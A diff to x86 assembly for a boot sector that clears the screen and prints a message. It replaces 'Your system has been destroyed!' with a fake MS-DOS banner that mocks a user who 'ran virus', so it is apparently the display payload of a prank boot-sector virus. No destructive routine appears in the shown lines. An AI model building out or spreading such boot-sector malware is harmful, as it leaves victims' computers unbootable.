@@ -42,13 +42,13 @@ halt:
 cls:
 	mov ah, 0x07   ; Print function
 	mov al, 0x00   ; Lines to scroll
-	mov bh, 0x04   ; Black background and white color (This can be changed according to the BIOS colors), same as CMD color command!
+	mov bh, 0x07   ; Black background and white color (This can be changed according to the BIOS colors), same as CMD color command!
 	mov cx, 0x00   ; Initialize register
 	mov dx, 0x184f ; Initialize register
 	int 0x10       ; Call the BIOS interrupt!
 	ret            ; Return
 
-display db "Your system has been destroyed!", 13, 10, "Like & Subscribe!", 13, 10, 0 ; The null terminator is very important!
+display db " MS-DOS Version 6.22 Stupid edition", 13, 10, "     (c) DAVIDhaxx666 200 AD", 13, 10, "C:\Bro is so dumb he ran virus\>", 13, 10, 0 ; The null terminator is very important!
 times 510 - ($ - $$) db 0 ; Zero remaining sectors
 dw 0xaa55 ; Bootable signature
 
